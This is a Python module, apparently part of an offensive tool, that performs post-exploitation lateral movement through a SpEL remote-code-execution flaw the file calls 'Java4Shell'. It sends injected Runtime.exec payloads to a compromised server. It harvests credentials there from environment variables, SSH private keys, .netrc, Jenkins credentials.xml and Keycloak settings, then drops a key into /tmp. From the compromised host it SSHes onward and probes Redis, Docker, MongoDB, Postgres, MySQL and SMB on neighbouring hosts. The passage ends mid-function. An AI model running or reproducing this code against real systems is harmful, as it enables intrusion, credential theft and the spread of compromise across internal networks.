# language: Python 3.10+, file: modules/post/lateral.py
# Post-exploitation: lateral movement from a confirmed Java4Shell RCE target.
#
# Phase 1 — Host Discovery:
#   /proc/net/arp       → ARP cache (live L2 neighbours)
#   /proc/net/route     → routing table (reachable subnets, gateways)
#   /etc/hosts          → static name→IP mappings
#   /proc/net/tcp[6]    → ESTABLISHED connections (high-value: already-trusted)
#
# Phase 2 — Credential Harvesting:
#   env grep, ~/.ssh/id_rsa, known_hosts, /etc/ssh host key,
#   find *.pem / id_rsa, .netrc, Jenkins credentials.xml, Keycloak KC_DB_PASSWORD
#
# Phase 3 — SSH Lateral Movement:
#   Per host × credential: SpEL Runtime.exec ssh / sshpass
#
# Phase 4 — Service Probing:
#   Ports 22, 5432, 3306, 6379, 27017, 2375/2376, 445/139
#   Redis PING, Docker /version, MongoDB isMaster, psql/mysql one-liner

import base64
import json
import re
import socket
import time
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── ANSI colours ────────────────────────────────────────────────────────────

_R  = "\033[31m"
_G  = "\033[32m"
_Y  = "\033[33m"
_B  = "\033[34m"
_C  = "\033[36m"
_W  = "\033[1;37m"
_RE = "\033[0m"


# ─── Dataclasses ─────────────────────────────────────────────────────────────

@dataclass
class LateralHost:
    ip: str
    source: str = ""                             # "arp", "route", "connections", "hosts"
    open_ports: list[int] = field(default_factory=list)
    ssh_success: bool = False
    ssh_output: str = ""
    ssh_technique: str = ""                      # "key", "password", "sshpass"
    services: dict[int, str] = field(default_factory=dict)   # port → banner/status
    docker_exposed: bool = False
    redis_noauth: bool = False
    notes: list[str] = field(default_factory=list)


@dataclass
class LateralResult:
    hosts_discovered: list[LateralHost] = field(default_factory=list)
    ssh_sessions: list[str] = field(default_factory=list)    # "user@host" that worked
    docker_hosts: list[str] = field(default_factory=list)
    redis_hosts: list[str] = field(default_factory=list)
    extracted_keys: list[str] = field(default_factory=list)  # paths of found SSH keys
    total_hosts: int = 0
    success: bool = False
    notes: list[str] = field(default_factory=list)
    error: Optional[str] = None


# ─── TLS context ─────────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ─── Core delivery helpers ────────────────────────────────────────────────────

def _exec_and_read(target_url: str, endpoint_path: str,
                   command: str, timeout: float) -> str:
    """
    Deliver `command` to the remote JVM via SpEL Runtime.exec / Scanner pattern.
    Command is base64-encoded to avoid quoting issues.
    Returns stdout of the command (best-effort extraction) or empty string.
    """
    b64_cmd = base64.b64encode(command.encode()).decode()
    spel = (
        f'new java.util.Scanner('
        f'T(java.lang.Runtime).getRuntime().exec('
        f'new String[]{{"bash","-c",'
        f'new String(T(java.util.Base64).getDecoder().decode("{b64_cmd}"))'
        f'}}).getInputStream()).useDelimiter("\\\\A").next()'
    )
    body = json.dumps({"expression": spel}).encode()
    headers = {
        "Content-Type": "application/json",
        "User-Agent":   "Java4Shell-Lateral/1.0",
    }
    req = urllib.request.Request(
        target_url.rstrip("/") + endpoint_path,
        data=body,
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            raw = r.read(131072).decode(errors="replace")
            return _strip_response(raw)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(131072).decode(errors="replace")
            return _strip_response(raw)
        except Exception:
            return ""
    except Exception:
        return ""


def _strip_response(body: str) -> str:
    """
    Try to pull the actual command output out of whatever the server returned.
    Checks JSON fields first, then falls back to raw body.
    """
    for field_name in ("output", "result", "stdout", "data", "message", "text", "value"):
        m = re.search(rf'"{field_name}"\s*:\s*"((?:[^"\\]|\\.)*)"', body)
        if m:
            candidate = m.group(1).replace("\\n", "\n").replace("\\t", "\t")
            if len(candidate) > 2:
                return candidate
    # Return the raw body if it has content
    stripped = body.strip()
    if stripped and len(stripped) > 2:
        return stripped[:8192]
    return ""


def _exec_multi(target_url: str, endpoints: list[dict], command: str,
                timeout: float) -> str:
    """Try the command across up to three endpoints; return first non-empty output."""
    for ep in endpoints[:3]:
        out = _exec_and_read(target_url, ep["path"], command, timeout)
        if out:
            return out
    return ""


# ─── Phase 1: Host discovery ──────────────────────────────────────────────────

def _hex_ip_to_str(hex_ip: str) -> Optional[str]:
    """
    Convert a little-endian hex IP (from /proc/net/route and /proc/net/tcp) to
    dotted-decimal.  e.g. '0101A8C0' → '192.168.1.1'
    """
    try:
        raw = bytes.fromhex(hex_ip)
        if len(raw) != 4:
            return None
        return ".".join(str(b) for b in reversed(raw))
    except Exception:
        return None


def _hex_ip6_to_str(hex_ip6: str) -> Optional[str]:
    """
    Convert a hex-encoded IPv6 address (32 chars, little-endian per 4-byte word)
    from /proc/net/tcp6 to colon notation.
    Returns None on failure.
    """
    try:
        if len(hex_ip6) != 32:
            return None
        # /proc/net/tcp6 stores each 32-bit word in host byte order
        words = [hex_ip6[i:i+8] for i in range(0, 32, 8)]
        be_bytes = b"".join(bytes.fromhex(w)[::-1] for w in words)
        return socket.inet_ntop(socket.AF_INET6, be_bytes)
    except Exception:
        return None


def _is_private_ip(ip: str) -> bool:
    """Return True for RFC1918 / loopback / link-local addresses."""
    try:
        parts = [int(x) for x in ip.split(".")]
        if len(parts) != 4:
            return False
        a, b = parts[0], parts[1]
        # loopback
        if a == 127:
            return True
        # RFC1918
        if a == 10:
            return True
        if a == 172 and 16 <= b <= 31:
            return True
        if a == 192 and b == 168:
            return True
        # link-local
        if a == 169 and b == 254:
            return True
        return False
    except Exception:
        return False


def _parse_arp(raw: str) -> list[tuple[str, str]]:
    """
    Parse /proc/net/arp output.
    Returns list of (ip, mac) for entries that have a real MAC (not 00:00:00:00:00:00).
    """
    results = []
    for line in raw.splitlines()[1:]:    # skip header
        parts = line.split()
        if len(parts) < 4:
            continue
        ip  = parts[0]
        mac = parts[3]
        if mac == "00:00:00:00:00:00":
            continue
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
            results.append((ip, mac))
    return results


def _parse_route(raw: str) -> list[str]:
    """
    Parse /proc/net/route and return a list of unique non-default gateway IPs
    and subnet representative IPs (first host in each subnet).
    """
    gateways: set[str] = set()
    for line in raw.splitlines()[1:]:
        parts = line.split()
        if len(parts) < 3:
            continue
        # col 1: Destination (hex, little-endian), col 2: Gateway
        dest_hex    = parts[1]
        gateway_hex = parts[2]
        for h in (dest_hex, gateway_hex):
            ip = _hex_ip_to_str(h)
            if ip and ip != "0.0.0.0" and not ip.startswith("0.") and _is_private_ip(ip):
                gateways.add(ip)
    return list(gateways)


def _parse_etc_hosts(raw: str) -> list[str]:
    """
    Parse /etc/hosts and return IPs of non-loopback entries.
    """
    ips = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        if not parts:
            continue
        ip = parts[0]
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) and not ip.startswith("127.") and ip != "0.0.0.0":
            ips.append(ip)
    return ips


def _parse_proc_net_tcp(raw: str) -> list[str]:
    """
    Parse /proc/net/tcp (or tcp6).
    Returns remote IPs of ESTABLISHED connections (state 01).
    """
    ips = []
    for line in raw.splitlines()[1:]:
        parts = line.split()
        if len(parts) < 4:
            continue
        state = parts[3]
        if state != "01":        # 01 == ESTABLISHED
            continue
        remote_field = parts[2]  # hex "XXXXXXXX:PPPP"
        hex_ip = remote_field.split(":")[0]
        ip = _hex_ip_to_str(hex_ip) if len(hex_ip) == 8 else _hex_ip6_to_str(hex_ip)
        if ip and ip != "0.0.0.0" and not ip.startswith("127.") and ip != "::1":
            ips.append(ip)
    return ips


def _discover_hosts(target_url: str, endpoints: list[dict],
                    timeout: float, verbose: bool) -> list[LateralHost]:
    """
    Run all four discovery commands and merge results into a deduplicated
    list of LateralHost objects.
    """
    host_map: dict[str, LateralHost] = {}

    def _add(ip: str, source: str) -> None:
        if ip in host_map:
            if source not in host_map[ip].source:
                host_map[ip].source += f",{source}"
        else:
            host_map[ip] = LateralHost(ip=ip, source=source)

    # ARP cache
    if verbose:
        print(f"  {_B}[lateral]{_RE} Discovering hosts via ARP cache …")
    arp_raw = _exec_multi(target_url, endpoints, "cat /proc/net/arp", timeout)
    for ip, mac in _parse_arp(arp_raw):
        _add(ip, "arp")
        host_map[ip].notes.append(f"MAC: {mac}")

    # Routing table
    if verbose:
        print(f"  {_B}[lateral]{_RE} Parsing routing table …")
    route_raw = _exec_multi(target_url, endpoints, "cat /proc/net/route", timeout)
    for ip in _parse_route(route_raw):
        _add(ip, "route")

    # /etc/hosts
    if verbose:
        print(f"  {_B}[lateral]{_RE} Reading /etc/hosts …")
    hosts_raw = _exec_multi(target_url, endpoints, "cat /etc/hosts", timeout)
    for ip in _parse_etc_hosts(hosts_raw):
        _add(ip, "hosts")

    # /proc/net/tcp — ESTABLISHED connections (IPv4)
    if verbose:
        print(f"  {_B}[lateral]{_RE} Parsing /proc/net/tcp (established connections) …")
    tcp_raw = _exec_multi(target_url, endpoints, "cat /proc/net/tcp", timeout)
    for ip in _parse_proc_net_tcp(tcp_raw):
        _add(ip, "connections")

    # /proc/net/tcp6
    if verbose:
        print(f"  {_B}[lateral]{_RE} Parsing /proc/net/tcp6 …")
    tcp6_raw = _exec_multi(target_url, endpoints, "cat /proc/net/tcp6", timeout)
    for ip in _parse_proc_net_tcp(tcp6_raw):
        _add(ip, "connections")

    return list(host_map.values())


# ─── Phase 2: Credential harvesting ──────────────────────────────────────────

def _harvest_credentials(target_url: str, endpoints: list[dict],
                          timeout: float, verbose: bool,
                          extra_creds: Optional[list[str]]) -> tuple[list[str], Optional[str]]:
    """
    Collect credentials from the compromised host.
    Returns (cred_list, ssh_key_content_or_None).
    cred_list entries are "user:pass" or just "token_value".
    """
    creds: list[str] = list(extra_creds) if extra_creds else []
    ssh_key: Optional[str] = None

    # ── env vars ──────────────────────────────────────────────────────────
    if verbose:
        print(f"  {_B}[lateral]{_RE} Harvesting env credentials …")
    env_raw = _exec_multi(
        target_url, endpoints,
        'env | grep -E "(PASSWORD|SECRET|TOKEN|KEY|PASS|CRED)" 2>/dev/null',
        timeout,
    )
    for line in env_raw.splitlines():
        if "=" in line:
            var, _, val = line.partition("=")
            val = val.strip().strip('"').strip("'")
            if val and len(val) > 3:
                # Try to form user:pass pairs from common var name patterns
                user_m = re.search(r"(?:USER|USERNAME|USER_NAME)=([^\n]+)", env_raw, re.IGNORECASE)
                user = user_m.group(1).strip() if user_m else "admin"
                if any(k in var.upper() for k in ("PASSWORD", "PASS", "PASSWD")):
                    creds.append(f"{user}:{val}")
                elif any(k in var.upper() for k in ("SECRET", "TOKEN", "KEY", "CRED")):
                    creds.append(val)   # raw token for non-SSH usage

    # ── SSH private keys ──────────────────────────────────────────────────
    if verbose:
        print(f"  {_B}[lateral]{_RE} Looking for SSH private keys …")

    key_sources = [
        "cat ~/.ssh/id_rsa 2>/dev/null",
        "cat /root/.ssh/id_rsa 2>/dev/null",
        "cat /etc/ssh/ssh_host_rsa_key 2>/dev/null",
    ]
    for cmd in key_sources:
        raw = _exec_multi(target_url, endpoints, cmd, timeout)
        if "BEGIN" in raw and "PRIVATE KEY" in raw:
            ssh_key = raw
            if verbose:
                print(f"  {_G}[lateral]{_RE} SSH private key found via: {cmd}")
            break

    # ── Find additional key files ─────────────────────────────────────────
    find_pem = _exec_multi(
        target_url, endpoints,
        'find / -name "*.pem" -o -name "id_rsa" 2>/dev/null | head -20',
        timeout,
    )
    for path in find_pem.splitlines():
        path = path.strip()
        if path and not ssh_key:
            raw = _exec_multi(target_url, endpoints, f"cat {path} 2>/dev/null", timeout)
            if "BEGIN" in raw and "PRIVATE KEY" in raw:
                ssh_key = raw
                if verbose:
                    print(f"  {_G}[lateral]{_RE} SSH private key found at: {path}")
                break

    # ── .netrc ────────────────────────────────────────────────────────────
    netrc_raw = _exec_multi(
        target_url, endpoints,
        'find / -name ".netrc" 2>/dev/null | xargs cat 2>/dev/null',
        timeout,
    )
    # .netrc format: machine <host> login <user> password <pass>
    for m in re.finditer(
        r"machine\s+\S+\s+login\s+(\S+)\s+password\s+(\S+)",
        netrc_raw, re.IGNORECASE,
    ):
        creds.append(f"{m.group(1)}:{m.group(2)}")

    # ── Jenkins credentials.xml (master key hint, not full decryption) ────
    jenkins_cred_raw = _exec_multi(
        target_url, endpoints,
        "cat /var/jenkins_home/credentials.xml 2>/dev/null || "
        "find / -name credentials.xml -path '*/jenkins/*' 2>/dev/null | head -1 | xargs cat 2>/dev/null",
        timeout,
    )
    # Pull plaintext username/password pairs that happen to be unencrypted
    for m in re.finditer(
        r"<username>([^<]+)</username>\s*<password>([^<]+)</password>",
        jenkins_cred_raw, re.IGNORECASE,
    ):
        u, p = m.group(1), m.group(2)
        if not p.startswith("{"):    # skip AES-encrypted blobs
            creds.append(f"{u}:{p}")

    # ── Keycloak DB password ──────────────────────────────────────────────
    kc_raw = _exec_multi(
        target_url, endpoints,
        'env | grep KC_DB 2>/dev/null',
        timeout,
    )
    for line in kc_raw.splitlines():
        if "KC_DB_PASSWORD" in line and "=" in line:
            _, _, val = line.partition("=")
            val = val.strip()
            if val:
                # Likely a Postgres password; pair with common usernames
                for user in ("keycloak", "postgres", "admin"):
                    creds.append(f"{user}:{val}")

    # Deduplicate while preserving order
    seen: set[str] = set()
    unique_creds: list[str] = []
    for c in creds:
        if c not in seen:
            seen.add(c)
            unique_creds.append(c)

    return unique_creds, ssh_key


def _write_ssh_key_to_target(target_url: str, endpoints: list[dict],
                              key_content: str, timeout: float) -> bool:
    """
    Write extracted SSH private key to /tmp/.j4s_key on the TARGET host
    (so the target can use it to ssh onwards) and chmod 600 it.
    Returns True if the write appeared to succeed.
    """
    # Encode the key content so we can pass it safely through bash -c
    key_b64 = base64.b64encode(key_content.encode()).decode()
    write_cmd = (
        f'echo {key_b64} | base64 -d > /tmp/.j4s_key && chmod 600 /tmp/.j4s_key && echo OK'
    )
    out = _exec_multi(target_url, endpoints, write_cmd, timeout)
    return "OK" in out


# ─── Phase 3: SSH lateral movement ───────────────────────────────────────────

def _spel_exec_arr(target_url: str, endpoints: list[dict],
                   cmd_array: list[str], timeout: float) -> str:
    """
    Deliver a command via SpEL Runtime.exec(String[]) — avoids shell quoting issues
    when the command contains spaces or special characters.
    Returns the stdout output of the remote command.
    """
    # Serialise the array as Java new String[]{"a","b",...}
    escaped = [s.replace("\\", "\\\\").replace('"', '\\"') for s in cmd_array]
    arr_literal = "{" + ",".join(f'"{e}"' for e in escaped) + "}"
    spel = (
        f'new java.util.Scanner('
        f'T(java.lang.Runtime).getRuntime().exec('
        f'new String[]{arr_literal}'
        f').getInputStream()).useDelimiter("\\\\A").next()'
    )
    body = json.dumps({"expression": spel}).encode()
    headers = {
        "Content-Type": "application/json",
        "User-Agent":   "Java4Shell-Lateral/1.0",
    }
    for ep in endpoints[:3]:
        req = urllib.request.Request(
            target_url.rstrip("/") + ep["path"],
            data=body,
            headers=headers,
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
                raw = r.read(65536).decode(errors="replace")
                out = _strip_response(raw)
                if out:
                    return out
        except urllib.error.HTTPError as e:
            try:
                raw = e.read(65536).decode(errors="replace")
                out = _strip_response(raw)
                if out:
                    return out
            except Exception:
                pass
        except Exception:
            pass
    return ""


def _try_ssh_key(target_url: str, endpoints: list[dict],
                 host: str, user: str, timeout: float) -> str:
    """
    Attempt SSH using the key dropped at /tmp/.j4s_key on the target host.
    Returns stdout (should contain uid= if successful) or empty string.
    """
    cmd_array = [
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", f"ConnectTimeout={max(3, int(timeout // 3))}",
        "-i", "/tmp/.j4s_key",
        f"{user}@{host}",
        "id && hostname && head -5 /etc/passwd",
    ]
    return _spel_exec_arr(target_url, endpoints, cmd_array, timeout)


def _try_ssh_password(target_url: str, endpoints: list[dict],
                      host: str, user: str, password: str, timeout: float) -> tuple[str, str]:
    """
    Attempt password-based SSH.  Tries sshpass first (more reliable), then bare ssh
    via expect-style heredoc.
    Returns (output, technique_used).
    """
    ct = max(3, int(timeout // 3))

    # sshpass path — will fail silently if not installed on target
    sshpass_cmd = (
        f"sshpass -p '{password}' ssh "
        f"-o StrictHostKeyChecking=no "
        f"-o ConnectTimeout={ct} "
        f"{user}@{host} "
        f"'id && hostname && head -5 /etc/passwd' 2>/dev/null"
    )
    out = _exec_multi(target_url, endpoints, sshpass_cmd, timeout)
    if out and "uid=" in out:
        return out, "sshpass"

    # Fallback: SSH with BatchMode — will only work if the target already trusts us
    # (i.e., the key was written), but handle password via SSH_ASKPASS isn't feasible
    # over RCE; this is a best-effort probe.
    ssh_cmd = (
        f"ssh "
        f"-o StrictHostKeyChecking=no "
        f"-o BatchMode=yes "
        f"-o ConnectTimeout={ct} "
        f"{user}@{host} "
        f"'id && hostname' 2>/dev/null"
    )
    out2 = _exec_multi(target_url, endpoints, ssh_cmd, timeout)
    if out2 and "uid=" in out2:
        return out2, "password-batchmode"

    return "", ""


def _attempt_ssh(target_url: str, endpoints: list[dict],
                 lateral_host: LateralHost,
                 credentials: list[str],
                 key_dropped: bool,
                 timeout: float,
                 verbose: bool) -> None:
    """
    Try SSH into lateral_host using all available techniques.
    Mutates lateral_host in-place on success.
    """
    ip = lateral_host.ip

    # Key-based attempt first (noiseless, fastest)
    if key_dropped:
        for user in _derive_usernames(credentials):
            if verbose:
                print(f"    {_C}[ssh-key]{_RE} {user}@{ip} …")
            out = _try_ssh_key(target_url, endpoints, ip, user, timeout)
            if out and "uid=" in out:
                lateral_host.ssh_success   = True
                lateral_host.ssh_output    = out[:1000]
                lateral_host.ssh_technique = "key"
                lateral_host.notes.append(f"SSH key login succeeded as {user}")
                return

    # Password attempts
    for cred in credentials:
        if ":" not in cred:
            continue
        user, _, password = cred.partition(":")
        if not password:
            continue
        if verbose:
            print(f"    {_C}[ssh-pass]{_RE} {user}@{ip} …")
        out, tech = _try_ssh_password(target_url, endpoints, ip, user, password, timeout)
        if out and "uid=" in out:
            lateral_host.ssh_success   = True
            lateral_host.ssh_output    = out[:1000]
            lateral_host.ssh_technique = tech
            lateral_host.notes.append(f"SSH password login succeeded as {user} via {tech}")
            return


def _derive_usernames(credentials: list[str]) -> list[str]:
    """
    Extract usernames from credential list; add common defaults.
    """
    users: list[str] = []
    seen: set[str] = set()
    for cred in credentials:
        if ":" in cred:
            u = cred.split(":")[0]
            if u and u not in seen:
                users.append(u)
                seen.add(u)
    for default in ("root", "ubuntu", "ec2-user", "admin", "jenkins", "keycloak", "postgres"):
        if default not in seen:
            users.append(default)
            seen.add(default)
    return users


# ─── Phase 4: Service probing ─────────────────────────────────────────────────

def _spel_tcp_connect(target_url: str, endpoints: list[dict],
                      host: str, port: int, timeout: float) -> bool:
    """
    Use SpEL to open a TCP socket from the compromised JVM to host:port.
    Returns True if the connection succeeded (indicating the port is open and reachable).
    """
    ct_ms = int(timeout * 1000)
    spel = (
        f'new java.util.Scanner(('
        f'()-> {{'
        f'  java.net.Socket s = new java.net.Socket();'
        f'  s.connect(new java.net.InetSocketAddress("{host}", {port}), {ct_ms});'
        f'  s.close();'
        f'  return "OPEN";'
        f'}}).call()).useDelimiter("\\\\A").next()'
    )
    # Simpler approach that works with standard SpEL (no lambda support):
    # Use T(java.net.Socket) constructor — connect attempt throws if refused
    spel_simple = (
        f'T(java.net.Socket).getDeclaredConstructor('
        f'T(java.lang.String), T(int).TYPE'
        f').newInstance("{host}", {port}).close()'
    )
    # Practical SpEL socket check: try new Socket(host, port); catch means closed/filtered
    # We use Runtime.exec nc -z as the most reliable mechanism
    nc_cmd = f"nc -z -w {max(1, int(timeout//3))} {host} {port} 2>/dev/null && echo OPEN"
    out = _exec_multi(target_url, endpoints, nc_cmd, timeout)
    if "OPEN" in out:
        return True

    # Fallback: /dev/tcp bash builtin
    bash_tcp = f'bash -c "echo > /dev/tcp/{host}/{port}" 2>/dev/null && echo OPEN'
    out2 = _exec_multi(target_url, endpoints, bash_tcp, timeout)
    return "OPEN" in out2


def _probe_redis(target_url: str, endpoints: list[dict],
                 host: str, timeout: float) -> Optional[str]:
    """
    Send PING to Redis (port 6379).  Returns "+PONG" response or None.
    Uses bash /dev/tcp and read.
    """
    cmd = (
        f'bash -c "exec 3<>/dev/tcp/{host}/6379; '
        f'echo -e \'*1\\r\\n$4\\r\\nPING\\r\\n\' >&3; '
        f'read -t {max(2, int(timeout//3))} line <&3; echo $line" 2>/dev/null'
    )
    out = _exec_multi(target_url, endpoints, cmd, timeout)
    if out and ("+PONG" in out or "+pong" in out.lower()):
        return "+PONG"
    return None


def _probe_docker(target_url: str, endpoints: list[dict],
                  host: str, port: int, timeout: float) -> Optional[str]:
    """
    Probe Docker daemon on host:port.  Tries curl /version endpoint.
    Returns version JSON string on success, None otherwise.
    """
    ct = max(2, int(timeout // 3))
    cmd = f'curl -s --max-time {ct} http://{host}:{port}/version 2>/dev/null'
    out = _exec_multi(target_url, endpoints, cmd, timeout)
    if out and ("ApiVersion" in out or "Version" in out):
        return out[:500]
    # wget fallback
    cmd2 = f'wget -qO- --timeout={ct} http://{host}:{port}/version 2>/dev/null'
    out2 = _exec_multi(target_url, endpoints, cmd2, timeout)
    if out2 and ("ApiVersion" in out2 or "Version" in out2):
        return out2[:500]
    return None


def _probe_mongo(target_url: str, endpoints: list[dict],
                 host: str, timeout: float) -> Optional[str]:
    """
    Probe MongoDB on port 27017 — raw TCP with isMaster wire message.
    Uses bash /dev/tcp + printf to send OP_QUERY isMaster and check response.
    Returns "OPEN" or banner fragment, None on failure.
    """
    ct = max(2, int(timeout // 3))
    # Minimal MongoDB OP_QUERY for {isMaster: 1} in hex
    # (20-byte header + query document: {isMaster:1})
    mongo_hex = (
        "3a000000"  # messageLength = 58
        "01000000"  # requestID
        "00000000"  # responseTo
        "d4070000"  # opCode = OP_QUERY (2004)
        "00000000"  # flags
        "61646d696e2e24636d640000000000"  # fullCollectionName "admin.$cmd\0"
        "00000000"  # numberToSkip
        "01000000"  # numberToReturn
        "13000000"  # doc length
        "0869734d6173746572000100000000"  # {isMaster: 1}
    )
    cmd = (
        f'bash -c "exec 3<>/dev/tcp/{host}/27017; '
        f'printf \'\\x{chr(10).join(mongo_hex[i:i+2] for i in range(0,len(mongo_hex),2))}\' >&3 2>/dev/null; '
        f'timeout {ct} dd bs=1 count=50 <&3 2>/dev/null | xxd" 2>/dev/null'
    )
    # Simpler: just check if port is open + accept connection
    nc_cmd = f"nc -z -w {ct} {host} 27017 2>/dev/null && echo OPEN"
    out = _exec_multi(target_url, endpoints, nc_cmd, timeout)
    return "OPEN" if "OPEN" in out else None


def _probe_psql(target_url: str, endpoints: list[dict],
                host: str, credentials: list[str], timeout: float) -> Optional[str]:
    """
    Probe PostgreSQL on port 5432 with extracted credentials.
    Returns the output of a simple query on success.
    """
    ct = max(2, int(timeout // 3))
    for cred in credentials:
        if ":" not in cred:
            continue
        user, _, pw = cred.partition(":")
        # Try PGPASSWORD env var + psql
        cmd = (
            f'PGPASSWORD="{pw}" psql -h {host} -U {user} '
            f'-c "SELECT version();" -t 2>/dev/null | head -3'
        )
        out = _exec_multi(target_url, endpoints, cmd, timeout)
        if out and ("PostgreSQL" in out or "version" in out.lower()):
            return f"{user}:{pw} → {out[:200]}"
    return None


def _probe_mysql(target_url: str, endpoints: list[dict],
                 host: str, credentials: list[str], timeout: float) -> Optional[str]:
    """
    Probe MySQL/MariaDB on port 3306 with extracted credentials.
    """
    ct = max(2, int(timeout // 3))
    for cred in credentials:
        if ":" not in cred:
            continue
        user, _, pw = cred.partition(":")
        cmd = (
            f'mysql -h {host} -u {user} -p"{pw}" '
            f'-e "SELECT version();" 2>/dev/null | head -3'
        )
        out = _exec_multi(target_url, endpoints, cmd, timeout)
        if out and re.search(r"\d+\.\d+\.\d+", out):
            return f"{user}:{pw} → {out[:200]}"
    return None


def _probe_smb(target_url: str, endpoints: list[dict],
               host: str, timeout: float) -> bool:
    """Check if SMB ports (445, 139) are reachable."""
    ct = max(1, int(timeout // 4))
    for port in (445, 139):
        cmd = f"nc -z -w {ct} {host} {port} 2>/dev/null && echo OPEN"
        out = _exec_multi(target_url, endpoints, cmd, timeout)
        if "OPEN" in out:
            return True
    return False


def _probe_services(target_url: str, endpoints: list[dict],
                    lateral_host: LateralHost,
                    credentials: list[str],
                    timeout: float,
                    verbose: bool) -> None:
    """
    Probe all target services on a discovered host.
    Mutates lateral_host in-place with findings.
    """
    ip = lateral_host.ip
    probe_timeout = min(timeout, 8.0)   # keep per-service probes short

    service_checks: list[tuple[int, str]] = [
        (22,    "SSH"),
        (5432,  "PostgreSQL"),
        (3306,  "MySQL"),
        (6379,  "Redis"),
        (27017, "MongoDB"),
        (2375,  "Docker-plain"),
        (2376,  "Docker-TLS"),
        (445,   "SMB"),
        (139,   "NetBIOS"),
    ]

    for port, svc_name in service_checks:
        if verbose:
            print(f"    {_Y}[probe]{_RE} {ip}:{port} ({svc_name}) …", end=" ", flush=True)

        is_open = _spel_tcp_connect(target_url, endpoints, ip, port, probe_timeout)

        if not is_open:
            if verbose:
                print("closed")
            continue

        lateral_host.open_ports.append(port)
        if verbose:
            print(f"{_G}OPEN{_RE}")

        # ── Service-specific probing ────────────────────────────────────
        if port == 6379:
            pong = _probe_redis(target_url, endpoints, ip, probe_timeout)
            if pong:
                lateral_host.redis_noauth = True
                lateral_host.services[port] = pong

        elif port in (2375, 2376):
            version_json = _probe_docker(target_url, endpoints, ip, port, probe_timeout)
            if version_json:
                lateral_host.docker_exposed = True
                lateral_host.services[port] = version_json[:200]

        elif port == 27017:
            mongo_out = _probe_mongo(target_url, endpoints, ip, probe_timeout)
            if mongo_out:
                lateral_host.services[port] = mongo_out

        elif port == 5432 and credentials:
            psql_out = _probe_psql(target_url, endpoints, ip, credentials, probe_timeout)
            if psql_out:
                lateral_host.services[port] = psql_out

        elif port == 3306 and credentials:
            mysql_out = _probe_mysql(target_url, endpoints, ip, credentials, probe_timeout)
            if mysql_out:
                lateral_host.services[port] = mysql_out

        elif port in (445, 139):
            lateral_host.services[port] = "SMB/NetBIOS open"


# ─── SSH known_hosts secondary targets ───────────────────────────────────────

def _extract_known_host_ips(target_url: str, endpoints: list[dict],
                              timeout: float) -> list[str]:
    """
    Read ~/.ssh/known_hosts and extract IP addresses or hostnames
    that are recorded as trusted peers — high-value lateral targets.
    """
    raw = _exec_multi(
        target_url, endpoints,
        "cat ~/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null | head -100",
        timeout,
    )
    ips: list[str] = []
    seen: set[str] = set()
    for line in raw.splitlines():
        # known_hosts format: hostname[,ip] key-type key
        host_field = line.split()[0] if line.strip() else ""
        for part in host_field.split(","):
            part = part.strip("[]").split(":")[0]   # strip optional port
            # Is it an IP?
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", part) and part not in seen:
                ips.append(part)
                seen.add(part)
    return ips


# ─── Main function ─────────────────────────────────────────────────────────────

def run_lateral(fp: FingerprintResult,
                core: ExploitCoreResult,
                credentials: Optional[list[str]] = None,
                ssh_key: Optional[str] = None,
                timeout: float = 15.0,
                verbose: bool = False) -> LateralResult:
    """
    Execute the full lateral movement chain against the confirmed RCE target.

    Args:
        fp:          Fingerprint result from scanning phase
        core:        ExploitCoreResult — oob_triggered must be True
        credentials: Optional pre-loaded ["user:pass", ...] pairs
        ssh_key:     Optional path to attacker's own SSH private key content
                     (the content itself, not a path; will be dropped to /tmp/.j4s_key)
        timeout:     Per-request HTTP timeout in seconds
        verbose:     Print progress lines

    Returns LateralResult.
    """
    result = LateralResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — lateral movement requires confirmed RCE."
        result.notes.append("Run exploit_core first.")
        return result

    base      = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    if not endpoints:
        endpoints = [{"path": "/", "priority": 0}]

    # ── Phase 1: Host Discovery ─────────────────────────────────────────────
    if verbose:
        print(f"\n{_W}[lateral]{_RE} ── Phase 1: Host Discovery ──────────────────────")

    hosts = _discover_hosts(base, endpoints, timeout, verbose)

    # Supplement with known_hosts entries
    kh_ips = _extract_known_host_ips(base, endpoints, timeout)
    existing_ips = {h.ip for h in hosts}
    for ip in kh_ips:
        if ip not in existing_ips:
            hosts.append(LateralHost(ip=ip, source="known_hosts"))
            existing_ips.add(ip)

    result.hosts_discovered = hosts
    result.total_hosts      = len(hosts)

    if verbose:
        print(f"  {_G}[lateral]{_RE} Discovered {len(hosts)} host(s): "
              f"{', '.join(h.ip for h in hosts[:10])}"
              f"{'…' if len(hosts) > 10 else ''}")

    if not hosts:
        result.notes.append("No internal hosts discovered — ARP/route/tcp tables may be empty.")
        return result

    # ── Phase 2: Credential Harvesting ─────────────────────────────────────
    if verbose:
        print(f"\n{_W}[lateral]{_RE} ── Phase 2: Credential Harvesting ───────────────")

    creds, extracted_key = _harvest_credentials(
        base, endpoints, timeout, verbose, credentials
    )

    # Merge caller-supplied SSH key content (takes precedence)
    active_key_content = ssh_key or extracted_key

    if verbose:
        print(f"  {_G}[lateral]{_RE} Credentials collected: {len(creds)}")
        if active_key_content:
            print(f"  {_G}[lateral]{_RE} SSH private key available ({len(active_key_content)} bytes)")

    # Drop the SSH key onto the target host so it can use it
    key_dropped = False
    if active_key_content:
        key_dropped = _write_ssh_key_to_target(base, endpoints, active_key_content, timeout)
        if key_dropped:
            result.extracted_keys.append("/tmp/.j4s_key")
            if verbose:
                print(f"  {_G}[lateral]{_RE} SSH key dropped to /tmp/.j4s_key on target ✓")
        else:
